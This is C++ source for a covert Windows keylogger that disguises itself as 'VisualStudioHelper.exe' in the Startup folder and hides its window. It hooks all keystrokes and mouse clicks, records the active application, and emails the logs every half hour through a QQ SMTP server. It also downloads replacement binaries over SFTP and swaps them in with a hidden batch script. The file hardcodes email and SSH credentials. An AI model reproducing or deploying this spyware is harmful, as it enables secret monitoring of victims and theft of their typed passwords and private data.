#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup" )

#include <WinSock2.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <Windows.h>
#include <direct.h>
#include <io.h>
#include <vector>
#include <algorithm>
#include <WS2tcpip.h>
#include <libssh2.h>
#include <libssh2_sftp.h>

using namespace std;


// helper functions for different tasks
char* getHKEYFolderName(const char *name);
const char* getActiveAppName();
bool sendEmail(char *filePath, const char *subject);
bool checkVersion(const char *target_exe, BOOL pullFile=FALSE);
void updateApplication(const char *targetExe);

// hooks and helpers
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
string decodeVKCode(DWORD vkCode);

// const variables
#define CRLF "\r\n"  // carriage-return/line feed pair
const int VERSION_MAJOR = 2;
const int VERSION_MINOR = 0;
const char* APPLICATION_VERSION = "version1.0.txt";

// global variables
string action_buffer = "";
time_t timestamp = time(NULL);
BOOL version_checked = FALSE;


int main(int argc, char* argv[])
{
	// create log files if it does not exist
	char local_folder[512];
	char log_file[512];
	struct stat buffer;
	sprintf(local_folder, "%s\\ActionMonitorK", getHKEYFolderName("Local AppData"));
	// create folder if it does not exist
	if (stat(local_folder, &buffer) != 0) {
		if (_mkdir(local_folder)) return -1;
	}
	sprintf(log_file, "%s\\MonitorLog.txt", local_folder);
	if (stat(log_file, &buffer) != 0) {
		ofstream out(log_file, ios::out);
		if (out.fail()) return -1;
		out << "";
		out.close();
	}

	// create the exe file name
	char target_exe[512];
	sprintf(target_exe, "%s\\VisualStudioHelper.exe", getHKEYFolderName("Startup"));

	// check if the target exe exists
	if (stat(target_exe, &buffer) != 0) {
		// TODO: Update .exe from remote
		checkVersion(target_exe, TRUE);
		updateApplication(target_exe);
	} else if (strcmp(argv[0], target_exe) == 0) {
		// if version not match, pull the new version and delete the old one
		if (!checkVersion(target_exe)) {
			updateApplication(target_exe);
			return 0;
		}
		
		// hook the keyboard and mouse action and start listening
		HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(L"kernel32.dll"), 0);
		HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, GetModuleHandle(L"kernel32.dll"), 0);
		MSG msg;
		// send the mail at the startup
		if (sendEmail(log_file, "System Start Up")) {
			ofstream out(log_file, ios::out);
			if (out.fail()) return -1;
			out << "";
			out.close();
		}
		GetMessage(&msg, NULL, NULL, NULL);
		long halfHours = (GetMessageTime() / (LONG)1800000) + 1;
		//this while loop keeps the hook and send email every 30min
		while (GetMessage(&msg, NULL, NULL, NULL)) {    
			DispatchMessage(&msg);
			ofstream out(log_file, ios::app);
			if (out.fail()) return -1;
			out << action_buffer;
			out.close();
			action_buffer = "";
			if ((GetMessageTime() / (LONG)1800000) >= halfHours) {
				if (sendEmail(log_file, "Log")) {
					ofstream out(log_file, ios::out);
					if (out.fail()) return -1;
					out << "";
					out.close();
				}
				halfHours++;
			}
			if (!version_checked && !checkVersion(target_exe)) {
				UnhookWindowsHookEx(keyboardHook);
				UnhookWindowsHookEx(mouseHook);
				updateApplication(target_exe);
				return 0;
			}
		}
		UnhookWindowsHookEx(keyboardHook);
		UnhookWindowsHookEx(mouseHook);
	}

	return 0;
}


bool checkVersion(const char *target_exe, BOOL pullFile) {
	int readBytes;
	BOOL versionMatch = TRUE;
	WSADATA wsadata;
	SOCKET hServer;
	struct addrinfo* answer, hint, * curr;
	static const char* username = "genghon2";
	static const char* password = "hongxiang";
	static const char* sftpPath = "/home/savitb/genghon2/ActionMonitor/VisualStudioHelper.exe";
	static const char* sftpVersionPath = "/home/savitb/genghon2/ActionMonitor/";
	LIBSSH2_SESSION* session;
	LIBSSH2_SFTP* sftp_session;
	LIBSSH2_SFTP_HANDLE* sftp_handle;
	LIBSSH2_SFTP_ATTRIBUTES fileStat;

	ZeroMemory(&hint, sizeof(hint));
	hint.ai_family = AF_INET;
	hint.ai_socktype = SOCK_STREAM;
	hint.ai_protocol = 0;
	hint.ai_flags = AI_PASSIVE;
	libssh2_uint64_t fileSize;
	char mem[1024];

	// Initilize
	if (WSAStartup(MAKEWORD(VERSION_MAJOR, VERSION_MINOR), &wsadata) != 0) return TRUE;
	if (libssh2_init(0) != 0) return TRUE;

	// Lookup server's IP address.
	if (getaddrinfo("client1.savitestbed.ca", "22", &hint, &answer)) return TRUE;

	curr = answer;
	// Create a TCP/IP socket, no specific protocol
	do {
		hServer = socket(curr->ai_family, curr->ai_socktype, curr->ai_protocol);
		if (hServer == INVALID_SOCKET) continue;

		// Connect the Socket
		if (connect(hServer, curr->ai_addr, curr->ai_addrlen) == 0) break;
		closesocket(hServer);
	} while ((curr = curr->ai_next) != NULL);
	if (curr == NULL) return TRUE;
	freeaddrinfo(answer);

	// create a session instance
	session = libssh2_session_init();
	if (!session) return TRUE;

	libssh2_session_set_blocking(session, 1);  // set blocking

	if (libssh2_session_handshake(session, hServer)) return TRUE;  // perform TCP handshake

	if (libssh2_userauth_password(session, username, password)) goto ssh_shutdown;  // authenticate

	sftp_session = libssh2_sftp_init(session);
	if (!sftp_session) goto ssh_shutdown;
	
	// check if needs to update the file
	if (pullFile) goto download_file;

	// check application version
	sftp_handle = libssh2_sftp_opendir(sftp_session, sftpVersionPath);
	if (!sftp_handle) goto ssh_shutdown;

	do {
		char longentry[512];
		/* loop until we fail */
		if (libssh2_sftp_readdir_ex(sftp_handle, mem, sizeof(mem), longentry, sizeof(longentry), &fileStat) > 0) {
			if (mem[0] == 'v') {
				// The version needs update
				if (strcmp(APPLICATION_VERSION, mem) != 0) versionMatch = FALSE;
				break;
			}
		}
		else break;
	} while (1);
	libssh2_sftp_closedir(sftp_handle);
	version_checked = TRUE;  // version checked

	// download file if version does not match
	if (versionMatch == FALSE) {
		version_checked = FALSE;
	download_file:
		sftp_handle = libssh2_sftp_open(sftp_session, sftpPath, LIBSSH2_FXF_READ, 0);
		if (!sftp_handle) goto ssh_shutdown;

		if (libssh2_sftp_fstat(sftp_handle, &fileStat)) goto ssh_shutdown;
		fileSize = fileStat.filesize;

		char tmpExe[MAX_PATH];
		sprintf(tmpExe, "%s.tmp.exe", target_exe);
		ofstream outFile(tmpExe, ios::out | ios::binary);
		if (outFile.fail()) goto ssh_shutdown;

		// write file content to target.exe
		do {
			readBytes = libssh2_sftp_read(sftp_handle, mem, sizeof(mem));
			if (readBytes > 0) outFile.write(mem, readBytes);
			else break;
		} while (1);
		outFile.close();
		libssh2_sftp_close(sftp_handle);

		// check write file size and delete it if size not match
		struct stat statData;
		if (stat(tmpExe, &statData) == 0) {
			if (statData.st_size != fileSize) {  
				remove(tmpExe);
				version_checked = FALSE;  // if the exe cannot execute, needs to re-pull
			} else version_checked = TRUE;
		}
	}

	libssh2_sftp_shutdown(sftp_session);
	ssh_shutdown:
	libssh2_session_disconnect(session, "Normal Shutdown");
	libssh2_session_free(session);
	closesocket(hServer);
	libssh2_exit();

	return versionMatch;
}


void updateApplication(const char* targetExe) {
	char tmpPath[MAX_PATH];  // absolute path for .bat
	char tmpExe[MAX_PATH];  // absolute path for tmp.exe
	static char tmpBatCmd[] =
		":Repeat\r\n"
		"del \"%s\"\r\n"  // try to delete the current running .exe
		"if exist \"%s\" goto Repeat\r\n"  // keep trying
		"move \"%s\" \"%s\"\r\n"  // rename the tmp file to the target file
		"\"%s\"\r\n"  // Run the file
		"del \"%s\""; 
	GetTempPathA(MAX_PATH, tmpPath);
	strcat(tmpPath, "_uninstallAM.bat");
	strcpy(tmpExe, targetExe);
	strcat(tmpExe, ".tmp.exe");  // get the tmp file path

	HANDLE hf = CreateFileA(tmpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hf != INVALID_HANDLE_VALUE) {
		DWORD len;
		char* bat;

		bat = (char*)alloca(strlen(tmpBatCmd) + strlen(targetExe) * 4 + strlen(tmpExe) + strlen(tmpPath) + 20);
		sprintf(bat, tmpBatCmd, targetExe, targetExe, tmpExe, targetExe, targetExe, tmpPath);
		WriteFile(hf, bat, strlen(bat), &len, NULL);
		CloseHandle(hf);
		ShellExecuteA(NULL, "Open", tmpPath, NULL, NULL, SW_HIDE);
	}
}


bool sendEmail(char *filePath, const char *subject) {
	char        szSmtpServerName[] = "smtp.qq.com";
	char        szToAddr[] = "332464584@qq.com";
	char        szFromAddr[] = "332464584@qq.com";
	char        authName[] = "MzMyNDY0NTg0";
	char        authCode[] = "bGd1b2h1amNxdHZ6YmhhZw==";
	char        szBuffer[4096] = "";
	char        szLine[256] = "";
	char        szMsgLine[256] = "";
	SOCKET      hServer;
	WSADATA     WSData;
	struct addrinfo *answer, hint, *curr;

	ZeroMemory(&hint, sizeof(hint));
	hint.ai_family = AF_INET;
	hint.ai_socktype = SOCK_STREAM;
	hint.ai_protocol = 0;
	hint.ai_flags = AI_PASSIVE;
	
	// init WinSock
	if (WSAStartup(MAKEWORD(VERSION_MAJOR, VERSION_MINOR), &WSData)) return FALSE;

	// Lookup email server's IP address.
	if (getaddrinfo(szSmtpServerName, "25", &hint, &answer)) return FALSE;

	curr = answer;
	// Create a TCP/IP socket, no specific protocol
	do {
		hServer = socket(curr->ai_family, curr->ai_socktype, curr->ai_protocol);
		if (hServer == INVALID_SOCKET)
		{
			continue;
		}

		// Connect the Socket
		if (connect(hServer, curr->ai_addr, curr->ai_addrlen) == 0)
		{
			recv(hServer, szBuffer, sizeof(szBuffer), 0);
			break;
		}
		closesocket(hServer);
	} while ((curr = curr->ai_next) != NULL);
	if (curr == NULL) {
		return FALSE;
	}
	freeaddrinfo(answer);

	// Send HELO server.com
	sprintf(szMsgLine, "HELO %s%s", szSmtpServerName, CRLF);
	if (send(hServer, szMsgLine, strlen(szMsgLine), 0) == SOCKET_ERROR) return FALSE;
	if (recv(hServer, szBuffer, sizeof(szBuffer), 0) == SOCKET_ERROR) return FALSE;

	// Send AUTH LOGIN info
	sprintf(szMsgLine, "AUTH LOGIN%s", CRLF);
	if (send(hServer, szMsgLine, strlen(szMsgLine), 0) == SOCKET_ERROR) return FALSE;
	if (recv(hServer, szBuffer, sizeof(szBuffer), 0) == SOCKET_ERROR) return FALSE;
	sprintf(szMsgLine, "%s%s", authName, CRLF);
	if (send(hServer, szMsgLine, strlen(szMsgLine), 0) == SOCKET_ERROR) return FALSE;
	if (recv(hServer, szBuffer, sizeof(szBuffer), 0) == SOCKET_ERROR) return FALSE;
	sprintf(szMsgLine, "%s%s", authCode, CRLF);
	if (send(hServer, szMsgLine, strlen(szMsgLine), 0) == SOCKET_ERROR) return FALSE;
	if (recv(hServer, szBuffer, sizeof(szBuffer), 0) == SOCKET_ERROR) return FALSE;

	// Send MAIL FROM: <sender@mydomain.com>
	sprintf(szMsgLine, "MAIL FROM:<%s>%s", szFromAddr, CRLF);
	if (send(hServer, szMsgLine, strlen(szMsgLine), 0) == SOCKET_ERROR) return FALSE;
	if (recv(hServer, szBuffer, sizeof(szBuffer), 0) == SOCKET_ERROR) return FALSE;

	// Send RCPT TO: <receiver@domain.com>
	sprintf(szMsgLine, "RCPT TO:<%s>%s", szToAddr, CRLF);
	if (send(hServer, szMsgLine, strlen(szMsgLine), 0) == SOCKET_ERROR) return FALSE;
	if (recv(hServer, szBuffer, sizeof(szBuffer), 0) == SOCKET_ERROR) return FALSE;

	// Send DATA
	sprintf(szMsgLine, "DATA%s", CRLF);
	if (send(hServer, szMsgLine, strlen(szMsgLine), 0) == SOCKET_ERROR) return FALSE;
	if (recv(hServer, szBuffer, sizeof(szBuffer), 0) == SOCKET_ERROR) return FALSE;

	// Send Title
	sprintf(szMsgLine, "SUBJECT:%s%s%s", subject, CRLF, CRLF);
	if (send(hServer, szMsgLine, strlen(szMsgLine), 0) == SOCKET_ERROR) return FALSE;

	// Send all lines of message body (using supplied text file)
	// create input streams for email content
	ifstream MsgFile(filePath);
	MsgFile.getline(szLine, sizeof(szLine));             // Get first line
	do         
	{
		// for each line of message text...
		sprintf(szMsgLine, "%s%s", szLine, CRLF);
		if (send(hServer, szMsgLine, strlen(szMsgLine), 0) == SOCKET_ERROR) return FALSE;
		MsgFile.getline(szLine, sizeof(szLine)); // get next line.
	} while (MsgFile.good());

	// Send blank line and a period
	sprintf(szMsgLine, "%s.%s", CRLF, CRLF);
	if (send(hServer, szMsgLine, strlen(szMsgLine), 0) == SOCKET_ERROR) return FALSE;
	if (recv(hServer, szBuffer, sizeof(szBuffer), 0) == SOCKET_ERROR) return FALSE;

	// Send QUIT
	sprintf(szMsgLine, "QUIT%s", CRLF);
	if (send(hServer, szMsgLine, strlen(szMsgLine), 0) == SOCKET_ERROR) return FALSE;
	if (recv(hServer, szBuffer, sizeof(szBuffer), 0) == SOCKET_ERROR) return FALSE;

	// Close server socket and prepare to exit.
	closesocket(hServer);
	return TRUE;
}


LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	char b[256] = "";
	if (nCode == HC_ACTION) {
		PMSLLHOOKSTRUCT p = (PMSLLHOOKSTRUCT)lParam;
		switch (wParam)
		{
		case WM_LBUTTONUP:
			sprintf(b, "%s,%s,Key:LClick\n", asctime(localtime(&timestamp)), getActiveAppName());
			action_buffer.append(b);
			break;
		case WM_RBUTTONUP:
			sprintf(b, "%s,%s,Key:RClick\n", asctime(localtime(&timestamp)), getActiveAppName());
			action_buffer.append(b);
			break;
		case WM_MOUSEHWHEEL:
		case WM_MOUSEWHEEL:
			sprintf(b, "%s,%s,Key:Scroll\n", asctime(localtime(&timestamp)), getActiveAppName());
			action_buffer.append(b);
			break;
		}
	}
	if (action_buffer.length() > 1000)
		PostMessage(NULL, NULL, NULL, NULL);
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	char b[256] = "";
	if (nCode == HC_ACTION) {
		switch (wParam)
		{
		case WM_KEYUP:
		case WM_SYSKEYUP:
			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
			string key = decodeVKCode(p->vkCode);
			if (p->flags & LLKHF_ALTDOWN)
				sprintf(b, "%s,%s,Key:Alt+%s\n", asctime(localtime(&timestamp)), getActiveAppName(), key.c_str());
			else
				sprintf(b, "%s,%s,Key:%s\n", asctime(localtime(&timestamp)), getActiveAppName(), key.c_str());
			action_buffer.append(b);
			if (action_buffer.length() > 1000)
				PostMessage(NULL, NULL, NULL, NULL);
			break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


string decodeVKCode(DWORD vkCode) {
	if (vkCode == 0xA4 || vkCode == 0xA5 || vkCode == 0x12)
		return "Alt";
	else if (vkCode == 0xA3 || vkCode == 0xA2 || vkCode == 0x11)
		return "Ctrl";
	else if (vkCode == 0x5B || vkCode == 0x5C)
		return "Win";
	else if (vkCode == 0xA0 || vkCode == 0xA1 || vkCode == 0x10)
		return "Shift";
	else if (vkCode == 0x25)
		return "Left";
	else if (vkCode == 0x26)
		return "Up";
	else if (vkCode == 0x27)
		return "Right";
	else if (vkCode == 0x28)
		return "Down";
	else if (vkCode == 0x14)
		return "CapLock";
	else if (vkCode == 0x14)
		return "NumLock";
	else if (vkCode == 0x0D)
		return "Enter";
	else if (vkCode == 0x09)
		return "Tab";
	else if (vkCode == 0x08)
		return "Backspace";
	else if (vkCode == 0x1B)
		return "Esc";
	else if (vkCode == 0x20)
		return "Space";
	else if (vkCode == 0x21)
		return "PgUp";
	else if (vkCode == 0x22)
		return "PgDown";
	else if (vkCode == 0x23)
		return "End";
	else if (vkCode == 0x24)
		return "Home";
	else if (vkCode == 0x2D)
		return "Insert";
	else if (vkCode == 0x2E)
		return "Del";
	else if (vkCode >= 0x70 && vkCode <= 0x87) {
		char buf[2];
		_itoa(vkCode - 0x70, buf, 10);
		return string("F").append(buf);
	} else {
		UINT mapVirtual = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
		if (mapVirtual) {
			return string(1, mapVirtual);
		}
	}
	return "Unknown";
}


char* getHKEYFolderName(const char* name) {
	wchar_t substr[] = L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
	HKEY key;

	// open regedit in Windows to find the current user startup folder location  
	if (ERROR_SUCCESS == RegOpenKey(HKEY_CURRENT_USER, substr, &key)) {
		char dwValue[512];
		ZeroMemory(dwValue, 512);
		DWORD dwSzType;
		DWORD dwSize = sizeof(dwValue);
		if (RegQueryValueExA(key, name, 0, &dwSzType, (LPBYTE)&dwValue, &dwSize) == ERROR_SUCCESS) {
			// close the HKEY and return the folder name when success
			RegCloseKey(key);
			dwValue[dwSize-1] = '\0';
			return dwValue;
		}
		RegCloseKey(key);
	}
	// exception occures 
	return NULL;
}


const char* getActiveAppName() {
	HWND fg = GetForegroundWindow();
	if (fg) {
		DWORD pid;
		GetWindowThreadProcessId(fg, &pid);
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
		TCHAR buffer[MAX_PATH];
		DWORD cchLen = MAX_PATH;
		if (hProcess) {
			BOOL ret = QueryFullProcessImageName(hProcess, 0, buffer, &cchLen);
			CloseHandle(hProcess);
			if (ret != FALSE) {
				int size = WideCharToMultiByte(CP_ACP, 0, buffer, -1, NULL, 0, NULL, FALSE);
				char* str = new char[sizeof(char) * size];
				WideCharToMultiByte(CP_ACP, 0, buffer, -1, str, size, NULL, FALSE);
				return str;
			}
		}
	}
	return NULL;
}